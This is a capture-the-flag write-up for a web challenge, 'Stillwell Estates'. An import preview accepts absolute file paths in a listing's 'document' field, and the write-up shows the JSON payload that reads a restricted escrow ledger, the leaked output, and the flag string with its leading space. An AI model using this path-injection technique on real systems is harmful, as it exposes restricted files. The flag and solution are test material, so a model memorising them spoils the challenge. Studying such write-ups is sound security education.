---
title: "Stillwell Estates"
category: "Web"
tags: []
solve_date: "2026-11-01"
language: "en"
---

# Stillwell Estates

## Challenge

The Stillwell agent portal imports Brotli-compressed partner exports and previews the listings and their attached documents. The preview code builds a file path from the listing's `document` field; directory traversal with `..` is filtered, but absolute paths are accepted. That gives an arbitrary file read, and the restricted closing ledger at `/tmp/stillwell-private/escrow-ledger.txt` contains the authorization token. The token in the ledger begins with a single leading space, which matters because the platform compares exact bytes.

## Solution

### Step 1: Find the import surface

The front end exposes an "agent import studio" that accepts `stillwell.agency-export/1`, Brotli-compressed JSON (`.br`), and ships a `sample-export.br`. The preview renders each listing and its attached document, so the document path is attacker-controlled.

### Step 2: Read the restricted ledger with an absolute path

The document reader rejects `../` sequences but not absolute paths. Submit an export whose listing points `document` at the ledger outside the web root:

```json
{
  "format": "stillwell.agency-export/1",
  "properties": [
    {
      "title": "Meadow House",
      "document": "/tmp/stillwell-private/escrow-ledger.txt"
    }
  ]
}
```

Brotli-compress the JSON and upload it through the import form (`feed` field). The preview excerpt contains:

```
STILLWELL REALTY - RESTRICTED ESCROW LEDGER
Account: 12-RIVER / Closing desk
Access: closing counsel and designated brokerage principals only

Closing authorization:  hiCTF{s1l3nt_l4n73rn_3573735_f2dc06f8ca}
```

The double space after the colon is not a formatting artifact: the flag value itself starts with one space. The deployment's `RCTF_FLAG` was passed with a leading space, and the server copies it verbatim into the ledger.

### Step 3: Submit the exact bytes

The web submission form trims whitespace, so submitting the visible string fails. Submitting the exact token (one leading space) through the platform API is accepted:

```text
candidate repr: ' hiCTF{s1l3nt_l4n73rn_3573735_f2dc06f8ca}'
HTTP 200
{"kind":"goodFlag","message":"The flag is correct."}
```

## Result

```
 hiCTF{s1l3nt_l4n73rn_3573735_f2dc06f8ca}
```

The flag has exactly one leading space; the markdown block above preserves it.
